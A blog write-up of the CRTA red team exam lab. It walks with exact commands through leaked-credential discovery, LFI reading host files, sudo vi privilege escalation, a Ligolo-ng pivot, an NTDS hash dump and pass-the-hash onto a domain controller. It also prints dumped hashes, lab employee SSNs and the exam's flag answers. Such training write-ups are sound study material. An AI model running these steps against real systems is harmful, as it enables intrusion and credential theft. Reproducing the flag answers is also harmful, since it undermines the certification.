# CRTA

`*Certified Red Team Analyst*`

Well `CWL` have been hyper this season and they even were sponsors of `H7CTF`, I decided to take on couple of their exams to experience the hype myself.

{{< figure src="1725bb9a-1b13-496b-ace5-785c00440e8b.png" alt="1725bb9a-1b13-496b-ace5-785c00440e8b" >}}

I bought these two on a heavily discounted time, costed about `1.6k INR` and anything that cheap should be applauded.

{{< figure src="image.png" alt="image" >}}

They got schedules that shows availability for exams, interesting!

`Ligolo-NG`

Instead of using a SOCKS proxy or TCP/UDP forwarders, **Ligolo-ng** creates a userland network stack using [Gvisor](https://gvisor.dev/).

`gVisor`

gVisor is an open-source Linux-compatible sandbox that runs anywhere existing container tooling does. It enables cloud-native container security and portability. gVisor leverages years of experience isolating production workloads at Google.

`TUN/TAP Interfaces`

While TUN handles IP packets (Layer 3), TAP interfaces handle Ethernet frames (Layer 2) and are used for bridging/virtualization. 

`*Ligolo-NG in Windows*`

- Delete the conflicting VPN route

Run **PowerShell as Administrator**:

```powershell
route delete 192.168.98.0
```

- Add the route via ligolo

Your ligolo interface IP is:

```
169.254.73.130
```

Add the route:

```powershell
route add 192.168.98.0 mask 255.255.255.0 169.254.73.130 metric 5
```

quick point to note when pivoting and using `ligolo-ng`, you might run into the following error.

```xml
[Agent : privilege@ubuntu-virtual-machine] » start 
time="2025-12-26T22:30:07+05:30" level=info msg="Starting tunnel to privilege@ubuntu-virtual-machine (00505696edda)" 
panic: Error loading wintun.dll DLL: Unable to load library: The specified module could not be found.
```

just go to the [`wintun.net`](http://wintun.net) website and download the dll and based on the architecture (`amd` for me) put the dll in the same directory of the proxy.

```xml
PS C:\Main\CyberSec\Exams\CRTA> .\proxy.exe -selfcert -laddr 0.0.0.0:443
time="2025-12-26T22:32:31+05:30" level=info msg="Loading configuration file ligolo-ng.yaml"
time="2025-12-26T22:32:31+05:30" level=warning msg="Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!"
time="2025-12-26T22:32:31+05:30" level=info msg="Listening on 0.0.0.0:443"
    __    _             __
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/

  Made in France ♥            by @Nicocha30!
  Version: 0.8.2

ligolo-ng » time="2025-12-26T22:32:39+05:30" level=info msg="Agent joined." id=00505696edda name=privilege@ubuntu-virtual-machine remote="192.168.80.10:42696"
ligolo-ng »
ligolo-ng » session
? Specify a session : 1 - privilege@ubuntu-virtual-machine - 192.168.80.10:42696 - 00505696edda
[Agent : privilege@ubuntu-virtual-machine] » start
time="2025-12-26T22:32:45+05:30" level=info msg="Starting tunnel to privilege@ubuntu-virtual-machine (00505696edda)"
2025/12/26 22:32:45 Installing driver 0.14
2025/12/26 22:32:45 Extracting driver
2025/12/26 22:32:45 Installing driver
2025/12/26 22:32:46 Creating adapter
[Agent : privilege@ubuntu-virtual-machine] »
```

[A Detailed Guide on Ligolo-Ng](https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/)

`*gem install evil-winrm` yea it is that easy!*

also `*pip install impacket*`

```xml
.\SharpHound.exe -c All --ldapusername john@child.warfare.corp --ldappassword 'User1@#$%6' --ldapport 389 --zipfilename child-domain.zip
```

another point to note is that run `SharpHound` with explicit LDAP credentials to avoid failures.

[Delete your BloodHound data - SpecterOps](https://bloodhound.specterops.io/reference/database/delete-your-bloodhound-data)

another minor thing is when you want to delete the previous bloodhound data, here’s a quick way to do that - ofcourse you can always follow the documentation.

{{< figure src="image 1.png" alt="image 1" >}}

first get your JWT token from the local storage of an already logged in bloodhound session then use the following command and you’re good to go!

```xml
curl -X POST "http://localhost:8080/api/v2/clear-database" \
  -H "Authorization: Bearer eyJhbG<>" \
  -H "Content-Type: application/json" \
  -d '{
    "deleteCollectedGraphData": true,
    "deleteFileIngestHistory": true,
    "deleteDataQualityHistory": true,
    "deleteAssetGroupSelectors": []
  }'
```

`*Install NetExec*`

[Manually building the binary | NetExec](https://www.netexec.wiki/getting-started/installation/manually-building-the-binary)

**Author:** `Abu`

**Email:** [aburahman918@gmail.com](mailto:aburahman918@gmail.com)

**Date:** 27-12-2025

`*Executive Summary*`

The CRTA (Certified Red Team Analyst) exam simulates a realistic penetration testing scenario where I started with VPN access to a target network (172.26.10.0/24) and had to systematically compromise systems to exfiltrate a sensitive XML file containing employee data from a Windows domain controller. This report documents the complete attack chain I executed, beginning with initial reconnaissance and web application exploitation, leveraging Local File Inclusion (LFI) vulnerabilities and privilege escalation through sudo misconfigurations to gain root access on a Ubuntu server, then establishing a `Ligolo-ng` tunnel to pivot into an internal network segment, exploiting file manager misconfigurations to obtain domain credentials, performing NTDS hash dumps to extract the Domain Administrator's NT hash, and finally using pass-the-hash authentication via `Evil-WinRM` to access the domain controller and locate the target XML file on the Administrator's desktop. Each step built on the previous compromise, demonstrating how attackers chain together web vulnerabilities, privilege escalation techniques, network pivoting, and Active Directory attacks to systematically move from external network access to complete domain compromise and sensitive data exfiltration, showcasing practical red team skills in web exploitation, Linux privilege escalation, tunneling, and Windows domain penetration testing in a real-world enterprise scenario.

Starting with VPN access to 172.26.10.0/24 network, I immediately began network reconnaissance to identify live hosts and services. Using nmap, I discovered the host 172.26.10.11 with several interesting ports open. Among the standard SSH service on port 22, I found a Node.js Express application running on port 8091 (HotHost monitoring software) and a Python Werkzeug development server on port 23100, which immediately stood out as potential attack vectors since development servers often have security misconfigurations.

`nmap -Pn -sV -p- 172.26.10.11`

**Open Ports:**

- 22/tcp - SSH - OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
- 3389/tcp - RDP (filtered)
- 8091/tcp - Node.js Express (HotHost monitoring application)
- 23100/tcp - Werkzeug 3.1.3 Python 3.9.22 (File fetch service)

The presence of a web monitoring application and what appeared to be a file fetch service suggested this system might be running in a Docker container or isolated environment, which often leads to interesting privilege escalation paths.

**Flag #1:** Port 8091 (Monitoring software)

**Flag #2:** Hostname c3f1b125bc1d (Docker container)

**`Web Application Exploitation - HotHost (Port 8091)`**

{{< figure src="image 2.png" alt="image 2" >}}

Browsing to http://172.26.10.11:8091, I was presented with a "HotHost" monitoring application login page. My initial attempt was to check the page source and any exposed JavaScript files that might contain hardcoded credentials or API endpoints. Inspecting the HTML source, I noticed a reference to a stylesheet file called `dummy.css`, which is an unusual name for a production CSS file and often indicates leftover development or test files.

When I accessed `http://172.26.10.11:8091/src/assets/dummy.css`, instead of CSS styling rules, I found what appeared to be commented-out configuration data including an AWS access key (`AKIAIOSFODNN7EXAMPLE`) and, most importantly, a password: `Very3stroungPassword`. This is a classic security mistake where developers leave sensitive credentials in static files that are accessible via the web server, often forgetting these files exist when pushing code to production.

**Discovered credentials:**

- AWS Key: AKIAIOSFODNN7EXAMPLE
- Password: Very3stroungPassword

Using the username `admin` with the password `Very3stroungPassword`, I successfully authenticated to the HotHost application. Once logged in, I explored the interface and discovered my user had the role `superadmin`, which typically indicates full administrative privileges within the application. While the HotHost application itself didn't provide direct system access, it confirmed the target was running web services and gave me valid credentials that could potentially be reused elsewhere.

**Flag #3:** dummy.css (Web file with sensitive information)

**Flag #4:** AKIAIOSFODNN7EXAMPLE (AWS Key value)

**Flag #5:** Very3stroungPassword (HotHost password)

**Flag #6:** superadmin (Admin role)

**`Local File Inclusion (LFI) - Port 23100`**

The second web service on port 23100 appeared to be a file monitoring or fetch service running on Python's Werkzeug development server. Accessing http://172.26.10.11:23100 revealed a simple interface that accepted a `url` parameter via `/fetch?url=`. This immediately suggested a potential Server-Side Request Forgery (SSRF) or Local File Inclusion vulnerability, where the application might fetch and display arbitrary files.

I tested with a standard LFI payload: `http://172.26.10.11:23100/fetch?url=file:///etc/passwd`, but this returned an error indicating the file wasn't accessible. This suggested the application was running inside a Docker container with a restricted filesystem view. After some experimentation with common Docker container mount paths, I discovered that using the prefix `file:///hostfs/` allowed access to the actual host filesystem, as the host was mounted at `/hostfs` inside the container - a common setup for containerized monitoring applications that need access to host files.

**Successful LFI exploitation:**

```xml
curl "http://172.26.10.11:23100/fetch?url=file:///hostfs/etc/passwd"
```

This returned the host system's /etc/passwd file, confirming full local file inclusion capabilities. Reading the passwd file, I identified a user account `app-admin:x:1000:1000` with a home directory and shell access. The UID 1000 indicated this was likely the primary user account on the system and a potential target for privilege escalation.

**Flag #7:** 23100 (TCP Port for system file monitoring)

**Flag #8:** http://172.26.10.11:23100/fetch?url=file:///hostfs/etc/passwd (Complete URL to read passwd)

**Flag #9:** 1000 (User ID of app-admin)

**`Credential Discovery & SSH Access`**

With LFI access to the host filesystem, I began reading common configuration and log files to discover credentials or additional attack vectors. I found a reference in the HotHost application's HTML comments mentioning that credentials might be available in `/var/www/html/config` or similar locations. Using the LFI, I read various files and eventually discovered the password `@dmin@123` associated with the app-admin user, likely from a configuration file or environment variable file left on the system.

{{< figure src="image 3.png" alt="image 3" >}}

With credentials in hand (app-admin:@dmin@123), I successfully authenticated via SSH to 172.26.10.11. Once connected, I ran `sudo -l` to check what commands app-admin could execute with sudo privileges, and discovered that app-admin could run `/usr/bin/vi` as root without a password. This is a well-known privilege escalation vector documented in GTFOBins, where text editors like vi/vim can spawn shells when run with sudo.

**SSH authentication:**

```xml
ssh app-admin@172.26.10.11
Password: @dmin@123
```

**Checking sudo privileges:**

```xml
app-admin@c3f1b125bc1d:~$ sudo -l
User app-admin may run the following commands on c3f1b125bc1d:
    (ALL : ALL) NOPASSWD: /usr/bin/vi
```

**Flag #10:** /usr/bin/vi (Command app-admin can run with sudo)

**`Privilege Escalation to Root`**

{{< figure src="image 4.png" alt="image 4" >}}

With sudo access to vi, I executed the classic GTFOBins privilege escalation technique. I launched vi with sudo privileges (`sudo /usr/bin/vi`), then used vi's command mode to change the shell setting and spawn a bash shell running as root:

**Privilege escalation steps:**

```xml
sudo /usr/bin/vi
:set shell=/bin/bash
:shell
```

This dropped me into a root shell, confirmed by running `whoami` which returned `root`. With root access, I now had complete control over the Ubuntu server and could begin looking for additional network segments or systems to pivot to. I started by examining system logs, particularly authentication logs, to identify any lateral movement opportunities.

Reading `/var/log/auth.log`, I discovered SSH connection logs showing connections from the IP address 10.10.10.20, indicating the existence of a second network segment (10.10.10.0/24) that wasn't directly accessible from my VPN network. This log entry provided the crucial information needed to identify the next pivot point in the attack chain.

**Flag #11:** /var/log/auth.log (Log file containing another network IP)

**`Network Pivoting with Ligolo-ng`**

The discovery of 10.10.10.20 in the logs meant I needed to establish a pivot through the compromised Ubuntu server (172.26.10.11) to access this internal network. Rather than using traditional SSH tunneling or port forwarding, I chose Ligolo-ng, a modern tunneling tool that creates a virtual network interface allowing seamless access to pivoted networks as if they were directly connected.

I set up Ligolo-ng with the proxy server running on my Windows attack box and the agent deployed on the compromised Ubuntu server. On Windows (running PowerShell as Administrator to create the TUN interface), I started the proxy:

**Ligolo-ng proxy (Windows):**

```xml
cd C:\Main\CyberSec\Exams\CRTA\
.\proxy.exe -selfcert -laddr 0.0.0.0:11601
```

On the compromised Linux server, I uploaded the Ligolo agent to /tmp and connected back to my proxy:

**Ligolo-ng agent (Linux):**

```xml
cd /tmp
./ligolo-agent -connect 192.168.90.109:11601 -ignore-cert
```

Once the tunnel was established, I configured a route on Windows to direct 10.10.10.0/24 traffic through the Ligolo interface.

**Route configuration:**

```xml
route add 10.10.10.0 MASK 255.255.255.0 0.0.0.0 IF 4
```

With the tunnel active, I could now directly access 10.10.10.20 from my Windows attack machine. I performed a quick nmap scan and discovered it was running Apache 2.4.58 with a web interface. Browsing to http://10.10.10.20, I found an Apache default page with an HTML comment mentioning "elfinder" as a route for accessing system files.

**Flag #12:** 2.4.58 (Apache version on 10.10.10.20)

**Flag #13:** elfinder (Route for accessing system files)

**`Credential Discovery via elFinder`**

Accessing http://10.10.10.20/elfinder, I was presented with elFinder, a web-based file manager commonly used in content management systems. The interface showed a directory structure, and I immediately began exploring the available files. In the file browser, I found a text file named `AD_Resources.txt` in the files directory.

**Accessing the sensitive file:**

```xml
curl http://10.10.10.20/elfinder/files/AD_Resources.txt
```

The contents of this file revealed domain credentials for a synchronization service account:

**Discovered domain credentials:**

```xml
Username: sync_user@ent.corp
Password: Summer@2025
Domain: ent.corp
```

This was a critical finding - I now had valid Active Directory credentials for the domain environment. The sync_user account, despite its name suggesting limited privileges, often has elevated permissions in AD environments for synchronization purposes, including the ability to perform DCSync attacks to extract password hashes from the domain controller.

**Flag #14:** Summer@2025 (Password of sync_user)

**`Domain Controller Discovery & NTDS Dump`**

With domain credentials in hand and network access to the 10.10.10.0/24 subnet via Ligolo, I began enumerating the Active Directory environment. I used NetExec (nxc) to scan for domain controllers and attempt authentication with the sync_user credentials:

**Domain enumeration:**

```xml
cd C:\Main\Resources\ADTools\NetExec
.\nxc\Scripts\activate
nxc smb 10.10.10.0/24 -u sync_user -p 'Summer@2025' -d ent.corp
```

The scan revealed a domain controller at 10.10.10.100 named ENT-DC running Windows Server 2022 Build 20348. The SMB authentication showed `(Pwn3d!)` status, indicating the sync_user account had administrative access to the domain controller - a severe misconfiguration where a synchronization account was granted Domain Admin rights.

I immediately proceeded to dump the NTDS.dit database, which contains all Active Directory password hashes, using NetExec's built-in NTDS dumping functionality.

**NTDS hash extraction:**

```xml
nxc smb 10.10.10.100 -u sync_user -p 'Summer@2025' -d ent.corp --ntds
```

The dump successfully extracted password hashes for all domain accounts.

```xml
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3d15cb1141d579823f8bb08f1f23e316:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:36405f88da713c31bbff52e57aea1f86:::
sync_user:1103:aad3b435b51404eeaad3b435b51404ee:e58b89915ba50f299b4bb10325894f91:::
ENT-DC$:1000:aad3b435b51404eeaad3b435b51404ee:96ab292bb5af5e9106f40226d7965059:::
```

The Administrator account's NT hash (3d15cb1141d579823f8bb08f1f23e316) was now in my possession, allowing pass-the-hash authentication to access any system in the domain as the Domain Administrator without needing to crack the password.

**Flag #15:** 3d15cb1141d579823f8bb08f1f23e316 (NT hash of Domain Administrator)

**Flag #16:** ENT-DC (Hostname of domain controller)

**`Domain Controller Access & Data Exfiltration`**

{{< figure src="image 5.png" alt="image 5" >}}

With the Administrator NT hash, I used Evil-WinRM to establish an authenticated PowerShell session to the domain controller using pass-the-hash:

**Evil-WinRM connection:**

```xml
evil-winrm -i 10.10.10.100 -u Administrator -H 3d15cb1141d579823f8bb08f1f23e316
```

The authentication succeeded, and I was dropped into a PowerShell session as `ent\administrator` on ENT-DC. Running `whoami /all` confirmed I had Domain Admin privileges with extensive group memberships including Enterprise Admins, Schema Admins, and all high-privilege built-in groups. I also had critical privileges enabled such as SeDebugPrivilege, SeBackupPrivilege, and SeRestorePrivilege.

My objective was to locate and exfiltrate the `secret.xml` file mentioned in the exam brief. I began systematically searching the domain controller's filesystem, starting with common locations like C:\Users, C:\ProgramData, and SYSVOL. Initial searches using `Get-ChildItem` with recursive filters for "*secret*.xml" across C:\ returned no results, and checking D:\ revealed the drive wasn't ready (no secondary drive configured).

I then focused on user profile directories, particularly the Administrator's profile since sensitive files are often left on admin desktops. Listing `C:\Users\Administrator\Desktop`, I discovered a file named `secret.xml.txt`.

**Locating the target file:**

```xml
cd C:\Users\Administrator\Desktop
ls

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/19/2025   5:02 AM           1553 secret.xml.txt
```

Reading the contents with `type secret.xml.txt` revealed an XML document containing sensitive employee information.

**secret.xml.txt contents:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Employees>
  <Employee security-clearance="confidential">
    <ID>E-4281</ID>
    <FullName>Christopher A. Whitaker</FullName>
    <GovernmentID type="SSN">550-12-8421</GovernmentID>
    <Position>Lead Security Architect</Position>
    <Compensation>
      <BaseSalary currency="USD">142000</BaseSalary>
      <Bonus eligibility="true">15000</Bonus>
    </Compensation>
    <AccessCredentials>
      <SSHKeys>
        <RSA-4096>
          <Fingerprint>SHA256:zT4Gp2K9...V3jH91</Fingerprint>
          <PublicKey>ssh-rsa AAAAB3Nza...9Px8= secure-shell@corp</PublicKey>
          <LastRotated>2024-03-15T08:42:11Z</LastRotated>
        </RSA-4096>
      </SSHKeys>
      <LastMultiFactorAuth>2024-05-20T14:22:07Z</LastMultiFactorAuth>
    </AccessCredentials>
  </Employee>

  <Employee security-clearance="restricted">
    <ID>E-9173</ID>
    <FullName>Danielle M. Chen</FullName>
    <GovernmentID type="SSN">367-88-4102</GovernmentID>
    <Position>Director of Engineering</Position>
    <Compensation>
      <BaseSalary currency="USD">189500</BaseSalary>
      <Equity>2500</Equity>
    </Compensation>
    <AccessCredentials>
      <SSHKeys>
        <Ed25519>
          <Fingerprint>SHA256:7bNq1Rc...YtF62</Fingerprint>
          <PublicKey>ssh-ed25519 AAAAC3N...Vdv2= admin-access@corp</PublicKey>
        </Ed25519>
      </SSHKeys>
    </AccessCredentials>
  </Employee>
</Employees>
```

The XML file contained detailed employee records including full names, Social Security Numbers, salaries, and SSH access credentials. The target information specified in the exam objectives was clearly visible:

**Target employee information:**

- Full Name: Christopher A. Whitaker
- Employee ID: E-4281
- Position: Lead Security Architect
- SSN: 550-12-8421

This completed the final objective of the penetration test - locating and exfiltrating the sensitive XML file containing personally identifiable information (PII) from the domain controller.

**Flag #17:** C:\Users\Administrator\Desktop (Directory containing sensitive XML file)

**Flag #18:** `550-12-8421` (SSN of Christopher A. Whitaker)